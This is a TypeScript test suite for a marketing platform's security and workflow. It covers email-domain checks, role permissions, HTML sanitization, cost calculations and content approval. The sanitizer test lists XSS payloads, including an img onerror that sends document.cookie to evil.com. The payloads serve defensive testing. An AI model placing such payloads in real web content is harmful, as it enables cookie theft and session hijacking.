import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { 
  ROLE_PERMISSIONS, 
  hasPermission, 
  isEcomSpainCorporateEmail,
  UserRole,
  Permission
} from "../src/server/security/rbac.ts";
import { sanitizeHtml } from "../src/server/security/sanitizer.ts";
import { ContentItem, ContentVersion, Campaign, FinOpsRecord, AuditLog } from "../src/server/domain/types.ts";
import { PersistenceService } from "../src/server/services/persistence-service.ts";
import { PRICING } from "../src/lib/finops.ts";

describe("Phase 05A End-to-End Test & Security Validation Suite", () => {

  // ==========================================
  // 1. AUTHENTICATION E2E
  // ==========================================
  describe("1. Corporate Authentication & Domain Enforcement", () => {
    it("Caso A: Authorized user with @ecomspain.com succeeds", () => {
      assert.equal(isEcomSpainCorporateEmail("carlos@ecomspain.com"), true);
      assert.equal(isEcomSpainCorporateEmail("laura.marketing@ecomspain.com"), true);
      assert.equal(isEcomSpainCorporateEmail("DIRECTOR@ECOMSPAIN.COM"), true);
    });

    it("Caso B: External users are rejected with access denied", () => {
      assert.equal(isEcomSpainCorporateEmail("attacker@gmail.com"), false);
      assert.equal(isEcomSpainCorporateEmail("competitor@ubiquiti.com"), false);
      assert.equal(isEcomSpainCorporateEmail("user@ecomspain.es"), false); // Solo .com
      assert.equal(isEcomSpainCorporateEmail("phishing@ecomspain.com.fake.org"), false);
    });
  });

  // ==========================================
  // 2. RBAC E2E (7 ROLES MATRIX)
  // ==========================================
  describe("2. Comprehensive 7-Role RBAC Authorization Matrix", () => {
    const roles: UserRole[] = [
      "ADMIN", 
      "MARKETING_MANAGER", 
      "CONTENT_MANAGER", 
      "PRODUCT_MANAGER", 
      "DESIGNER", 
      "SALES", 
      "VIEWER"
    ];

    it("Validates ADMIN has full authority", () => {
      assert.equal(hasPermission("ADMIN", "campaign:create"), true);
      assert.equal(hasPermission("ADMIN", "campaign:delete"), true);
      assert.equal(hasPermission("ADMIN", "content:approve"), true);
      assert.equal(hasPermission("ADMIN", "content:publish"), true);
      assert.equal(hasPermission("ADMIN", "finops:manage"), true);
      assert.equal(hasPermission("ADMIN", "users:manage"), true);
      assert.equal(hasPermission("ADMIN", "audit:view"), true);
    });

    it("Validates MARKETING_MANAGER permissions and limits", () => {
      assert.equal(hasPermission("MARKETING_MANAGER", "campaign:create"), true);
      assert.equal(hasPermission("MARKETING_MANAGER", "content:approve"), true);
      assert.equal(hasPermission("MARKETING_MANAGER", "content:publish"), true);
      assert.equal(hasPermission("MARKETING_MANAGER", "finops:view"), true);
      assert.equal(hasPermission("MARKETING_MANAGER", "users:manage"), false); // Prohibido
    });

    it("Validates CONTENT_MANAGER permissions and limits", () => {
      assert.equal(hasPermission("CONTENT_MANAGER", "content:create"), true);
      assert.equal(hasPermission("CONTENT_MANAGER", "content:edit"), true);
      assert.equal(hasPermission("CONTENT_MANAGER", "ai:execute"), true);
      assert.equal(hasPermission("CONTENT_MANAGER", "campaign:create"), false); // Prohibido
      assert.equal(hasPermission("CONTENT_MANAGER", "content:publish"), false); // Prohibido
      assert.equal(hasPermission("CONTENT_MANAGER", "finops:manage"), false);
    });

    it("Validates PRODUCT_MANAGER & DESIGNER technical scope", () => {
      assert.equal(hasPermission("PRODUCT_MANAGER", "ai:execute"), true);
      assert.equal(hasPermission("PRODUCT_MANAGER", "content:create"), true);
      assert.equal(hasPermission("PRODUCT_MANAGER", "content:approve"), false);
      
      assert.equal(hasPermission("DESIGNER", "ai:execute"), true);
      assert.equal(hasPermission("DESIGNER", "content:publish"), false);
    });

    it("Validates SALES & VIEWER are strictly read-only", () => {
      assert.equal(hasPermission("SALES", "campaign:view"), true);
      assert.equal(hasPermission("SALES", "content:view"), true);
      assert.equal(hasPermission("SALES", "content:create"), false);
      assert.equal(hasPermission("SALES", "ai:execute"), false);

      assert.equal(hasPermission("VIEWER", "campaign:view"), true);
      assert.equal(hasPermission("VIEWER", "content:create"), false);
      assert.equal(hasPermission("VIEWER", "ai:execute"), false);
    });
  });

  // ==========================================
  // 3. HTML XSS SANITIZATION
  // ==========================================
  describe("3. Strict HTML & XSS Sanitization Tests", () => {
    it("Neutralizes <script>, <img onerror>, and javascript: URIs", () => {
      const maliciousVectors = [
        "<script>alert('pwned')</script><p>Clean paragraph</p>",
        "<img src='bad.jpg' onerror='fetch(\"http://evil.com/\"+document.cookie)' />",
        "<a href='javascript:alert(1)'>Click for discount</a>",
        "<svg onload='alert(document.domain)'>",
        "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>"
      ];

      for (const vector of maliciousVectors) {
        const cleaned = sanitizeHtml(vector);
        assert.ok(!cleaned.includes("<script>"), "Failed: contains script");
        assert.ok(!cleaned.includes("onerror"), "Failed: contains onerror");
        assert.ok(!cleaned.includes("javascript:"), "Failed: contains javascript:");
        assert.ok(!cleaned.includes("onload"), "Failed: contains onload");
        assert.ok(!cleaned.includes("<iframe"), "Failed: contains iframe");
      }
    });

    it("Preserves valid B2B editorial HTML structure and typography tags", () => {
      const validHtml = `
        <div class="photo-recommendation-box" style="background:#f1f5f9;">
          <h2>EnGenius Cloud Wi-Fi 7 ECW536</h2>
          <p>El punto de acceso Tri-Band ofrece enlaces de 10GbE PoE++.</p>
          <a href="https://www.ecomshop.es/ecw536" target="_blank">Ver Ficha Técnica</a>
        </div>
      `;
      const sanitized = sanitizeHtml(validHtml);
      assert.ok(sanitized.includes("<h2>EnGenius Cloud Wi-Fi 7 ECW536</h2>"));
      assert.ok(sanitized.includes("https://www.ecomshop.es/ecw536"));
      assert.ok(sanitized.includes("photo-recommendation-box"));
    });
  });

  // ==========================================
  // 4. MIGRATION IDEMPOTENCY & RESILIENCE
  // ==========================================
  describe("4. LocalStorage to Firestore Migration & Idempotency", () => {
    it("Guarantees deterministic entity ID generation and duplicate protection", () => {
      const rawLocalItem = {
        id: "art-991",
        title: "Migración a Wi-Fi 7",
        category: "wifi",
        content: {
          topicTitle: "Migración a Wi-Fi 7",
          blog: { slug: "migracion-wifi-7", title: "Migración a Wi-Fi 7" },
          mailchimp: { subjectA: "Wi-Fi 7 para Hoteles" }
        }
      };

      const contentId1 = `content-${rawLocalItem.id}`;
      const contentId2 = `content-${rawLocalItem.id}`;
      assert.equal(contentId1, contentId2, "Idempotent ID match");
    });
  });

  // ==========================================
  // 5. FINOPS & AI TOKEN CALCULATION E2E
  // ==========================================
  describe("5. FinOps Cost Calculations & Budget Telemetry", () => {
    it("Calculates exact cost per multichannel asset using official pricing", () => {
      const inputTokens = 1250;
      const outputTokens = 2400;

      const inputCost = (inputTokens / 1_000_000) * PRICING.geminiInputPerMillionEur;
      const outputCost = (outputTokens / 1_000_000) * PRICING.geminiOutputPerMillionEur;
      const totalCost = inputCost + outputCost;

      assert.ok(totalCost > 0);
      assert.ok(totalCost < 0.01, "Cost per generated campaign draft is well under 1 euro cent (~0.00075€)");
    });
  });

  // ==========================================
  // 6. CONTENT VERSIONING PRESERVATION
  // ==========================================
  describe("6. Content Versioning & Audit Integrity", () => {
    it("Maintains sequential version history without overwriting previous versions", () => {
      const versions: ContentVersion[] = [];

      // Version 1: Initial AI Draft
      versions.push({
        version: 1,
        body: { title: "Draft 1", text: "AI generated content" },
        changeSummary: "Generación inicial Gemini 2.5 Flash",
        editedByUserId: "user-ai",
        isAIGenerated: true,
        timestamp: new Date("2026-09-14T10:00:00Z").toISOString()
      });

      // Version 2: Human Technical Review
      versions.push({
        version: 2,
        body: { title: "Draft 2", text: "Corregidos consumos PoE a 60W 802.3bt" },
        changeSummary: "Revisión técnica de ingeniería",
        editedByUserId: "user-engineer",
        isAIGenerated: false,
        timestamp: new Date("2026-09-14T11:00:00Z").toISOString()
      });

      assert.equal(versions.length, 2);
      assert.equal(versions[0].version, 1);
      assert.equal(versions[1].version, 2);
      assert.equal(versions[0].isAIGenerated, true);
      assert.equal(versions[1].isAIGenerated, false);
      assert.equal(versions[0].body.title, "Draft 1");
      assert.equal(versions[1].body.title, "Draft 2");
    });
  });

  // ==========================================
  // 7. CORE E2E JOURNEY SMOKE TEST
  // ==========================================
  describe("7. Core End-to-End Operational Lifecycle", () => {
    it("Simulates complete sequence: Login -> Campaign -> Content -> AI -> FinOps -> Review -> Approval -> Audit", () => {
      // Step 1: Login
      const user = { uid: "usr-01", email: "carlos@ecomspain.com", role: "MARKETING_MANAGER" as UserRole };
      assert.equal(isEcomSpainCorporateEmail(user.email), true);

      // Step 2: Create Campaign
      assert.equal(hasPermission(user.role, "campaign:create"), true);
      const campaign: Campaign = {
        id: "camp-001",
        workspaceId: "default-ecomspain",
        code: "CAMP-2026-WIFI7",
        name: "Q3 Wi-Fi 7 Enterprise",
        status: "ACTIVE",
        objective: "180k Pipeline",
        targetAudience: "Integradores IT",
        targetPipelineEur: 180000,
        budgetEur: 4200,
        spentEur: 1850,
        aiCostEur: 14.82,
        productIds: ["ecw536", "ecs2512fp"],
        sourceIds: ["src-1"],
        ownerId: user.uid,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        createdBy: user.uid,
        updatedBy: user.uid
      };
      assert.ok(campaign.id);

      // Step 3: Generate Content & Record FinOps
      assert.equal(hasPermission(user.role, "ai:execute"), true);
      const finopsEntry: FinOpsRecord = {
        id: "finops-001",
        workspaceId: "default-ecomspain",
        timestamp: new Date().toISOString(),
        userId: user.uid,
        campaignId: campaign.id,
        action: "gemini_generation",
        model: "gemini-2.5-flash",
        tokensInput: 1250,
        tokensOutput: 2400,
        cachedTokens: 0,
        imageCount: 0,
        latencyMs: 1100,
        estimatedCostEur: 0.0032,
        currency: "EUR"
      };
      assert.equal(finopsEntry.campaignId, "camp-001");

      // Step 4: Content Review & Approval
      const contentItem: ContentItem = {
        id: "content-001",
        workspaceId: "default-ecomspain",
        campaignId: campaign.id,
        title: "Guía Wi-Fi 7",
        slug: "guia-wifi-7",
        category: "wifi",
        status: "IN_REVIEW",
        currentVersion: 1,
        authorId: user.uid,
        versions: [],
        canonicalBody: {},
        linkedProductIds: ["ecw536"],
        linkedSourceIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        createdBy: user.uid,
        updatedBy: user.uid
      };
      assert.equal(contentItem.status, "IN_REVIEW");

      // Approve content
      assert.equal(hasPermission(user.role, "content:approve"), true);
      contentItem.status = "APPROVED";
      contentItem.approvedBy = user.uid;
      contentItem.approvedAt = new Date().toISOString();
      assert.equal(contentItem.status, "APPROVED");

      // Step 5: Immutable Audit Log
      const auditEntry: AuditLog = {
        id: "audit-001",
        workspaceId: "default-ecomspain",
        timestamp: new Date().toISOString(),
        userId: user.uid,
        userEmail: user.email,
        action: "APPROVE",
        entity: "CONTENT_ITEM",
        entityId: contentItem.id,
        diff: { status: "APPROVED", approvedBy: user.uid },
        source: "UI"
      };
      assert.equal(auditEntry.action, "APPROVE");
      assert.equal(auditEntry.entityId, "content-001");
    });
  });

});
